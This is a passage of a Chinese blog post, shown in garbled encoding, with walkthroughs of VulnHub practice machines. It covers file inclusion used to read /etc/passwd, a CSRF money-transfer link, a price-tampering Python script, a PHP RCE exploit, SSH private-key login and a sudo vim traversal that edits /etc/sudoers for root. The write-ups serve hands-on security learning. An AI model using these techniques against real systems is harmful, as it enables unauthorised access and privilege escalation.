´ç”¨æˆ·å®¶ç›®å½•</li><li>sshå…¬ç§é’¥ç™»å½•</li><li>å¯ææƒæ–‡ä»¶æ£€æµ‹</li></ul><ol><li><p>æ‰«ipï¼Œå‘ç°ç«¯å£22ï¼Œ80</p></li><li><p>æ‰«ç›®å½•ï¼Œå‘ç°äº†ä¸ªrobots.txtï¼Œæš‚æ—¶æ²¡å•¥ç”¨ï¼Œè¿˜æœ‰ä¸ª&#x2F;secret&#x2F; ä¸å¯ç›´æ¥æŸ¥çœ‹å†…å®¹<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161510525.png" alt="image-20230921161510525" style="zoom: 25%;"></p></li><li><p>æ‰«&#x2F;secret&#x2F;ä¸‹æ–‡ä»¶ï¼Œå¤±è´¥ï¼Œæ·»åŠ .phpåç¼€ï¼Œæ‰«åˆ°&#x2F;secret&#x2F;evil.php</p></li><li><p>ç›´æ¥è®¿é—®phpæ–‡ä»¶ï¼Œç©ºç©ºå¦‚ä¹Ÿï¼Œæœç´¢å¾—çŸ¥æ­¤å¤„å½“ç”¨ [å‚æ•°çˆ†ç ´] æˆ– [æ–‡ä»¶åŒ…å«æ£€æµ‹]</p></li><li><p>burpå¼€å§‹çˆ†ç ´ï¼Œå­—å…¸ç”¨web-fuzzing-diré‡Œçš„parameter 7wå¤šä¸ªå‚æ•°å</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/secret/evil.php?Â§aaaÂ§=../index.html</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.48.141<br></code></pre></td></tr></table></figure></li><li><p>å‘ç°å­˜åœ¨å‚æ•°commandï¼Œæ£€æŸ¥åç¡®å®šä¸ºæ–‡ä»¶åŒ…å«æ¼æ´<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921161918549.png" alt="image-20230921161918549">   <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230921162039258.png" alt="image-20230921162039258"></p></li><li><p>åˆ©ç”¨phpä¼ªåè®®ï¼Œæ‹¿åˆ°evil.phpæºç ï¼Œåªæœ‰ä¸€å¥includeï¼Œæ— ä»»ä½•é˜²æŠ¤ï¼Œç›´æ¥å¼€æ—¥</p></li><li><p>php:&#x2F;&#x2F;input å†™å…¥æ–‡ä»¶å¤±è´¥ï¼ŒæŸ¥çœ‹æ•æ„Ÿæ•°æ®&#x2F;etc&#x2F;passwdä¸Šå­˜åœ¨ä¸€ä¸ªç”¨æˆ·mowreeï¼Œåˆ©ç”¨å­—å…¸æ‰«æè¯¥ç”¨æˆ·ç›®å½•ä¸‹å­˜åœ¨çš„æ–‡ä»¶</p></li><li><p>æ¥ä¸‹æ¥æ¶‰åŠåˆ°sshå…¬ç§é’¥çˆ†ç ´å’Œå…¬é’¥ç™»å½•  æ‹¿shellåå†™å…¥&#x2F;etc&#x2F;passwdææƒ</p></li></ol><h3 id="pwn-the-tron1"><a href="#pwn-the-tron1" class="headerlink" title="pwn the tron1"></a>pwn the tron1</h3><ol><li><p>æ‰«ipï¼Œç«¯å£å¼€æ”¾22 80 è¿è¡Œä»¶ç‰ˆæœ¬æ²¡å•¥æ¼æ´</p></li><li><p>æŸ¥çœ‹ç½‘é¡µï¼Œå­˜åœ¨index.html å’Œ &#x2F;Travel&#x2F;index.htmlï¼Œé‡Œé¢æœ‰å‡ å¼ å›¾ç‰‡</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">A Tale <span class="hljs-keyword">of</span> Destructing<br>Cybertron was once <span class="hljs-keyword">a</span> home <span class="hljs-built_in">to</span> unique Autonomous Robotic Organism.<br>It has been thousands <span class="hljs-keyword">of</span> years since <span class="hljs-keyword">the</span> war between <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">and</span> Deceptions started <span class="hljs-keyword">on</span> <span class="hljs-title">Cybertron</span>.<br>It destroyed <span class="hljs-keyword">the</span> planet <span class="hljs-keyword">and</span> made <span class="hljs-keyword">it</span> inhaspitable <span class="hljs-keyword">and</span> dead.<br><br>æ¯ç­çš„æ•…äº‹<br>å¡ä¼¯å¦æ›¾ç»æ˜¯ç‹¬ç‰¹çš„è‡ªä¸»æœºå™¨äººæœ‰æœºä½“çš„å®¶å›­ã€‚<br>è‡ªä»æ±½è½¦äººå’Œæ¬ºéª—è€…ä¹‹é—´çš„æˆ˜äº‰åœ¨å¡ä¼¯å¦å¼€å§‹ä»¥æ¥ï¼Œå·²ç»è¿‡å»äº†æ•°åƒå¹´ã€‚<br>å®ƒæ‘§æ¯äº†è¿™ä¸ªæ˜Ÿçƒï¼Œä½¿å®ƒå˜å¾—ä¸å¯æ€è®®å’Œæ­»äº¡ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">They arrived <span class="hljs-keyword">at</span> our Blue Planet, continuing their battle across <span class="hljs-keyword">the</span> universe.<br>Optimus Prime, leader <span class="hljs-keyword">of</span> Autobots took pledge <span class="hljs-built_in">to</span> protect <span class="hljs-keyword">the</span> humanity <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> evil wrath <span class="hljs-keyword">of</span> Megation.<br>Though lessen <span class="hljs-keyword">in</span> <span class="hljs-built_in">number</span>, Autobots are surely <span class="hljs-keyword">the</span> unsung warrions standing <span class="hljs-keyword">in</span> between <span class="hljs-keyword">the</span> destruction <span class="hljs-keyword">and</span> life.<br><br>ä»–ä»¬æŠµè¾¾äº†æˆ‘ä»¬çš„è“è‰²æ˜Ÿçƒï¼Œç»§ç»­ä»–ä»¬åœ¨å®‡å®™ä¸­çš„æˆ˜æ–—ã€‚<br>æ±½è½¦äººé¢†è¢–æ“å¤©æŸ±å‘èª“è¦ä¿æŠ¤äººç±»å…å—Megationçš„é‚ªæ¶æ„¤æ€’ã€‚<br>è™½ç„¶æ•°é‡å‡å°‘ï¼Œä½†æ±½è½¦äººæ— ç–‘æ˜¯ç«™åœ¨æ¯ç­å’Œç”Ÿå‘½ä¹‹é—´çš„æ— åæˆ˜å£«ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Though Project Iacon, Megation <span class="hljs-built_in">found</span> <span class="hljs-keyword">out</span> about <span class="hljs-number">4</span> Omega Keys. <span class="hljs-keyword">If</span> these are used inside the Omega <span class="hljs-keyword">Lock</span> <span class="hljs-keyword">on</span> Cybertron, the Planet can be revived.<br>moreover, Omega <span class="hljs-keyword">Lock</span> can be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">transform</span> Earth thus wiping <span class="hljs-keyword">out</span> the Humanity..!<br><br>é€šè¿‡Iaconè®¡åˆ’ï¼ŒMegationå‘ç°äº†å¤§çº¦<span class="hljs-number">4</span>æŠŠæ¬§ç±³èŒ„é’¥åŒ™ã€‚å¦‚æœå°†å®ƒä»¬ç”¨äºå¡ä¼¯å¦çš„æ¬§ç±³èŒ„é”ä¸­ï¼Œè¡Œæ˜Ÿå°±å¯ä»¥å¤æ´»ã€‚<br>æ­¤å¤–ï¼Œæ¬§ç±³èŒ„é”å¯ä»¥ç”¨æ¥æ”¹é€ åœ°çƒï¼Œä»è€Œæ¶ˆç­äººç±»..ï¼<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">You are Jack. Assist <span class="hljs-keyword">the</span> Autobots <span class="hljs-keyword">in</span> stopping <span class="hljs-keyword">the</span> Megatron <span class="hljs-built_in">from</span> getting all <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> <span class="hljs-built_in">keys</span>. Are you uo <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> mission?!<br>off <span class="hljs-keyword">the</span> Secret Autobot base!<br><br>ä½ æ˜¯æ°å…‹ã€‚ååŠ©æ±½è½¦äººé˜»æ­¢å¨éœ‡å¤©è·å¾—æ‰€æœ‰ <span class="hljs-number">4</span> æŠŠé’¥åŒ™ã€‚ä½ å‡†å¤‡å¥½æ‰§è¡Œä»»åŠ¡äº†å—ï¼Ÿï¼<br>ç¦»å¼€ç§˜å¯†æ±½è½¦äººåŸºåœ°ï¼<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vim">Optimus prime was able <span class="hljs-keyword">to</span> <span class="hljs-keyword">find</span> encrypted coordinate of <span class="hljs-number">2</span> of <span class="hljs-built_in">keys</span> they appear <span class="hljs-keyword">to</span> <span class="hljs-keyword">be</span> in same place.<br>You(Jack) are dispatched with bumblebee <span class="hljs-built_in">and</span> Arcee <span class="hljs-keyword">to</span> obtain the <span class="hljs-built_in">keys</span> <span class="hljs-keyword">do</span> it before Soundwave <span class="hljs-keyword">is</span> able <span class="hljs-keyword">to</span> decrypt them!<br><br>Can you <span class="hljs-keyword">find</span> @deception-base <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the iacon_codes?<br>(Decepticons may <span class="hljs-keyword">delete</span> iacon codes out of security, <span class="hljs-keyword">find</span> <span class="hljs-keyword">a</span> way)<br><br>Encrypted message <span class="hljs-keyword">for</span> coordinates:<br>daab260727e470e56e77ec22e8f3d413<br><br>format <span class="hljs-keyword">for</span> decrypted message:<br><br>/iacon_code/(capital of <span class="hljs-keyword">a</span> countrey)/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = any digit fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br><br><br>æ“å¤©æŸ±èƒ½å¤Ÿæ‰¾åˆ° <span class="hljs-number">2</span> ä¸ªå¯†é’¥çš„åŠ å¯†åæ ‡ï¼Œå®ƒä»¬ä¼¼ä¹åœ¨åŒä¸€ä¸ªåœ°æ–¹ã€‚<br>ä½ ï¼ˆæ°å…‹ï¼‰è¢«æ´¾é£ä¸å¤§é»„èœ‚å’Œé˜¿å°”è¥¿ä¸€èµ·åœ¨å£°æ³¢èƒ½å¤Ÿè§£å¯†å®ƒä»¬ä¹‹å‰è·å¾—å¯†é’¥ï¼<br><br>ä½ èƒ½æ‰¾åˆ°@deceptionåŸºåœ°æ¥è·å¾—iacon_codeså—ï¼Ÿ<br>ï¼ˆéœ¸å¤©è™å¯èƒ½ä¼šå‡ºäºå®‰å…¨åŸå› åˆ é™¤ iacon ä»£ç ï¼Œæƒ³åŠæ³•ï¼‰<br><br>åæ ‡çš„åŠ å¯†æ¶ˆæ¯ï¼š<br>DAAB260727E470E56E77EC22E8F3D413<br><br>è§£å¯†æ¶ˆæ¯çš„æ ¼å¼ï¼š<br><br>/iacon_code/ï¼ˆæŸå›½å®¶é¦–éƒ½ï¼‰/&#123;Latitude_dd.dd-Longitude_dd.dd&#125;.txt<br><br>d = ä»»æ„æ•°å­— fron <span class="hljs-number">0</span>-<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure></li><li><p>ç»¼åˆè¿™å‡ ç¯‡ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥æœ‰ä¸¤ç§è§£æ³•ï¼Œè¦ä¹ˆæ‰¾åˆ°æ‰€è°“çš„deceptionåŸºåœ°ï¼Œæˆ–è€…ç›´æ¥çˆ†ç ´ï¼Œå…ˆçˆ†å‡ºé¦–éƒ½ï¼Œå†çˆ†æ•°å­—ã€‚</p></li><li><p>æˆ‘ä»¬å…ˆå°è¯•å¯»æ‰¾deceptionåŸºåœ°ï¼Œè¿™é‡Œç”¨åˆ°ä¸ªæ–°å·¥å…· <code>sharlock</code> ï¼ˆåŠç¤¾å·¥å·¥å…·ï¼Œåœ¨ç¤¾äº¤å¹³å°æœç´¢ç”¨æˆ·åï¼‰ï¼Œæ²¡æœå‡ºæ¥ï¼Œæ•™ç¨‹å†™çš„ä¹Ÿæœ‰é—®é¢˜ï¼Œæ‰«å‡ºæ¥æœ‰ä¸ª<code>deception-base</code>ï¼Œä½†æ˜¯æ­£ç¡®çš„ç”¨æˆ·å«<code>decepticon-base</code>ï¼Œå¤šäº†ä¸ªcï¼Œå’±ä¹Ÿä¸çŸ¥é“äººå®¶å’‹æ•´å‡ºæ¥æ­£ç¡®çš„ï¼Œåæ­£äººå®¶è¿™æ ·å†™çš„ï¼Œæˆ‘æ‰¾ä¸åˆ°</p></li><li><p>æˆ‘ä»¬è®¿é—®è¿™ä¸ªåŸºåœ°<code>https://github.com/decepticon-base/Projects</code>ï¼Œå‘ç°å†…å®¹è¢«åˆ äº†<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924123213003.png" alt="image-20230924123213003"></p></li><li><p>ç”¨<a href="http://archive.org/web/web.php">Wayback Machine</a>æŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼Œåªèƒ½è¯´çœŸç‰›é€¼<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924124522092.png" alt="image-20230924124522092"></p></li><li><p>å†™ä¸€ä»½è„šæœ¬è·‘ä¸€è·‘ï¼Œå‘ç°ä¹‹å‰å¹¼ç¨šäº†ï¼Œæ—¢è¦iaconï¼Œåˆè¦é¦–éƒ½ï¼Œå°±å¾ˆéš¾å—<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924131119001.png" alt="image-20230924131119001"></p></li><li><p>ok,è®¿é—®ä¸€ä¸‹</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Congrats On Getting Through <span class="hljs-keyword">the</span> First Stage!<br>Your Courage allowed us <span class="hljs-keyword">to</span> obtain <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-number">4</span> keys!<br>Here <span class="hljs-keyword">is</span> your <span class="hljs-keyword">first</span> Flag: Flag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>Bad News though :/ Megatron has <span class="hljs-number">2</span> <span class="hljs-keyword">of</span> keys <span class="hljs-keyword">at</span> his disposal. Prime <span class="hljs-keyword">and</span> Bumblebee got information <span class="hljs-keyword">from</span> Starscream, a traitor <span class="hljs-keyword">and</span> ex-commander <span class="hljs-keyword">for</span> Megatron <span class="hljs-keyword">about</span> secret <span class="hljs-built_in">item</span> he has hidden inside most expensive thing <span class="hljs-keyword">in</span> knockout&#x27;s shop. That <span class="hljs-built_in">item</span> has admin credentials.<br>Link <span class="hljs-keyword">to</span> shop: /W4RSHIP_Sh0P.php<br>Good Luck!<br><br>æ­å–œæ‚¨é€šè¿‡ç¬¬ä¸€é˜¶æ®µï¼<br>æ‚¨çš„å‹‡æ°”è®©æˆ‘ä»¬è·å¾—äº† <span class="hljs-number">4</span> æŠŠé’¥åŒ™ä¸­çš„ <span class="hljs-number">2</span> æŠŠï¼<br>è¿™æ˜¯æ‚¨çš„ç¬¬ä¸€ä¸ªæ ‡å¿—ï¼šFlag1&#123;<span class="hljs-number">873</span>b375210b4297e9bdea1ed183c2da5&#125;<br>åæ¶ˆæ¯ï¼š/å¨éœ‡å¤©æœ‰ <span class="hljs-number">2</span> æŠŠé’¥åŒ™ä¾›ä»–ä½¿ç”¨ã€‚Primeå’Œå¤§é»„èœ‚ä»Starscreamé‚£é‡Œå¾—åˆ°äº†ä¿¡æ¯ï¼ŒStarscreamæ˜¯å¨éœ‡å¤©çš„å›å¾’å’Œå‰æŒ‡æŒ¥å®˜ï¼Œå…³äºä»–è—åœ¨Knockoutå•†åº—ä¸­æœ€æ˜‚è´µçš„ä¸œè¥¿é‡Œçš„ç§˜å¯†ç‰©å“ã€‚è¯¥é¡¹ç›®å…·æœ‰ç®¡ç†å‘˜å‡­æ®ã€‚<br>å•†åº—é“¾æ¥ï¼š /W4RSHIP_Sh0P.php<br>ç¥ä½ å¥½è¿ï¼<br></code></pre></td></tr></table></figure></li><li><p>æ¥ç€è¿›å…¥å•†åº—é¡µé¢ï¼Œç»è¿‡è§‚å¯Ÿå¯èƒ½å­˜åœ¨csrfæ¼æ´ï¼Œæœ‰ä¸ªè½¬è´¦åŠŸèƒ½ï¼Œè½¬è´¦çš„å‘èµ·äººå’Œæ¥æ”¶äººéƒ½æ˜¯ä»¥å‚æ•°çš„å½¢å¼ä¼ é€’çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€æ®µè®©ç½‘ç«™ç®¡ç†å‘˜ç»™æˆ‘è½¬è´¦ä¸€ä¸‡å…ƒçš„é“¾æ¥ï¼Œå‘ç»™ç®¡ç†å‘˜(ç½‘ç«™â€åˆšå¥½â€æœ‰ä¸€ä¸ªå‘é€é‚®ä»¶çš„åŠŸèƒ½è€Œä¸”ç®¡ç†å‘˜â€åˆšå¥½â€ä¼šç‚¹å‡»è¿™ä¸ªé‚®ä»¶)ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è´­ä¹°åä¸¤ä¸ªkey</p></li><li><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230924195118235.png" alt="image-20230924195118235"></p></li><li><p>ç½‘ç«™ç®¡ç†å‘˜å«admin_bossï¼ˆæºç é‡Œç¿»åˆ°çš„ï¼‰<br><a href="http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amount=100000&from=lord_starscream">http://192.168.48.145/W4RSHIP_Sh0P_transfer.php?to=cxkcxk&amp;amount=100000&amp;from=lord_starscream</a> </p></li><li><p>å¾ˆå¥½ï¼Œç°åœ¨æˆ‘ä»¬æœ‰é’±äº†ï¼Œç›´æ¥ä¹°ä¹°ä¹°ï¼å”‰ï¼Ÿä¹°ä¸äº†ï¼ï¼ï¼   æŸ¥çœ‹æºç   <img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925084336824.png" alt="image-20230925084336824"></p></li><li><p>å¥½å¥½å¥½ï¼Œæ³¨é‡Šæˆ‘å˜é‡æ˜¯å§ï¼Œä¸Šè„šæœ¬ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://192.168.48.145/W4RSHIP_Sh0P_buy.php&quot;</span><br>data=&#123; <span class="hljs-string">&quot;itemid&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;price&quot;</span>:<span class="hljs-number">9999</span>&#125;<br>header=&#123;<br>    <span class="hljs-string">&#x27;cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=m20ttg2fihm10hbonpgv1v41rt&#x27;</span><br>&#125;<br><br>res = requests.post(url=url, data=data, headers=header)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925090251749.png" alt="image-20230925090251749"></p><p>14.<br>    <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Purchase Successful!Megatron <span class="hljs-keyword">Login</span> Panel URL: /M3G4TR0N_SUPR3M3/<span class="hljs-keyword">login</span>.php Username = L0RD_M3G4Tr0N <span class="hljs-keyword">Password</span> = freakishlylongpasswordforl0gin<br></code></pre></td></tr></table></figure></p><ol start="15"><li><p>ç™»é™†æˆåŠŸï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925090611785.png" alt="image-20230925090611785"></p></li><li><p>æ£€æŸ¥å‘ç°ç‰ˆæœ¬ä¸ºphp8.1devï¼Œsearchsploitä¸€ä¸‹ï¼Œå¥½å•Šï¼Œæˆ‘æœ€å–œæ¬¢RCEäº†ğŸ˜‹<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925091056326.png" alt="image-20230925091056326"><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925091539296.png" alt="image-20230925091539296"></p></li><li><p>tnndï¼Œè¿™ä¸ªè„šæœ¬çš„å‘½ä»¤è¡ŒçœŸå‚»å‘—ï¼Œç»è¿‡æˆ‘ä¸æ‡ˆçš„æ‘¸ç´¢(çœ‹æ”»ç•¥)ï¼Œç»ˆäºå­¦ä¼šäº†sshææƒå¹¶æˆåŠŸåœ¨<code>/home/soundwave/.ssh/pem/</code>ä¸‹æ‰¾åˆ°äº†ç§é’¥å¹¶æˆåŠŸç™»å…¥<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925094844657.png" alt="image-20230925094844657"></p></li><li><p>ä¸‹ä¸€æ­¥ï¼Œææƒï¼Œè¿™é‡Œæˆ‘è¯•è¯•æ–°å·¥å…·ï¼Œçœ‹èµ·æ¥éå¸¸çš„å…¨é¢å•Šï¼Œæˆ‘ä»¬æ•´ç†ä¸‹å¯èƒ½æœ‰ç”¨çš„ä¿¡æ¯</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/home/m</span>egatr0n/.sudo_as_admin_successful<br><br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/etc/</span>pam.d/passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/etc/</span>passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/bash-completion/</span>completions/passwd<br>passwd <span class="hljs-keyword">file</span>: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/lintian/</span>overrides/passwd<br><br>User soundwave may run the following commands on warship:<br>    (root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vim /</span>var<span class="hljs-regexp">/Decepticon/</span>*<br></code></pre></td></tr></table></figure></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20230925103945221.png" alt="image-20230925103945221"></p><ol start="19"><li><p>æˆ‘ä»¬å…ˆçœ‹äº†.&#x2F;sudo_as_admin_success ç©ºï¼Œæ¥ç€è”ç³»å¯æ‰§è¡Œå‘½ä»¤å’Œhistoryï¼Œå¾—çŸ¥ä½œè€…ä¿®æ”¹äº†æˆ‘ä»¬çš„sudoæƒé™ï¼Œç”¨çš„æ–¹æ³•å°±æ˜¯sudo vimï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ <code>sudo /usr/bin/vim</code>æ¥ä¿®æ”¹æ–‡ä»¶ï¼ŒåŒæ—¶åˆ©ç”¨æˆ‘ä»¬å¯ä¿®æ”¹çš„ç›®å½•<code>/var/Deception/*</code> æ¥å®ç°ç›®å½•ç©¿è¶Šï¼Œæœ€ç»ˆå‘½ä»¤</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">sudo <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vim /</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/Deception/</span>..<span class="hljs-regexp">/../</span>etc/sudoers<br></code></pre></td></tr></table></figure><p>å°†é‡Œé¢soundwaveç”¨æˆ·çš„å¯æ‰§è¡Œå‘½ä»¤æ”¹ä¸º NOPASSWD:ALL ,å³å¯æ— å¯†ç æ‰§è¡Œrootæƒé™ï¼Œæ‹¿åˆ°æœ€åä¸€ä¸ªflagã€‚</p></li><li><p>è¿™é‡Œæˆ‘å‚»å‘—äº†ï¼Œæ”¹æˆäº†(ALL:ALL) ALL, ç›´æ¥ç»™ä½œè€…çš„æ´ä¿®äº†ï¼Œçº¯NTè¡Œä¸ºã€‚</p></li></ol><h3 id="01-Empire-Lupin-One"><a href="#01-Empire-Lupin-One" class="headerlink" title="01 - Empire Lupin One"></a>01 - Empire Lupin One</h3><p>â€‹    </p><ol><li><p>æ‰«ipï¼Œç«¯å£å‘ç° 22 80</p></li><li><p>æ‰«ç›®å½•ï¼Œæ‰¾åˆ°ä¸ªrobots.txtï¼Œé‡Œé¢æœ‰ä¸ªæç¤º&#x2F;~myfile  ï¼Œç›´æ¥è®¿é—®æ­¤ç›®å½•æ— å¯ç”¨ä¿¡æ¯</p></li><li><p>åˆ©ç”¨fuzzå·¥å…·æ‰«ææŒ‡å®šæ ¼å¼çš„æ–‡ä»¶</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">fuff -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>big.txt -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.131</span>/~FUZZ<br></code></pre></td></tr></table></figure><ol start="4"><li>å‘ç°å­˜åœ¨~secretç›®å½•ï¼Œå†æ¬¡æ‰«æ<img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007102724324.png" alt="image-20231007102724324"></li></ol><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007102804791.png"></p><ol start="5"><li><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007105502775.png" alt="image-20231007105502775"></li></ol><p>çœ‹èµ·æ¥è¦ç”¨sshç§é’¥ç™»å½•ï¼Œæˆ‘ä»¬æ¥ç€æ‰«</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.131</span><span class="hljs-regexp">/~secret/</span>.FUZZ.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/vulnhub%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/image-20231007105725740.png" alt="image-20231007105725740"></p><ol start="6"><li>å‘ç°äº†<code>.mysecret.txt</code>æ–‡ä»¶ï¼Œè®¿é—®çœ‹ä¸€ä¸‹</li></ol><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">cGxD<span class="hljs-number">6</span>K<span class="hljs-symbol">NZQddY6</span>iCsSuqPzUdqSx<span class="hljs-number">4</span>F<span class="hljs-number">5</span>ohDY<span class="hljs-symbol">nArU3</span>kw<span class="hljs-number">5</span>dmvTURqcaTr<span class="hljs-symbol">ncHC3</span><span class="hljs-symbol">NLKBqFM2</span>ywr<span class="hljs-symbol">NbRTW3</span>eTpUvEz<span class="hljs-number">9</span>qFuB<span class="hljs-symbol">nyhAK8</span>TWu<span class="hljs-number">9</span>cFxLoscWUrc<span class="hljs-number">4</span>rLcRafiVvxPRpP<span class="hljs-number">692</span>Bw<span class="hljs-number">5</span>bshu<span class="hljs-number">6</span>ZZpixzJWv<span class="hljs-symbol">NZhPEoQoJRx7</span>jU<span 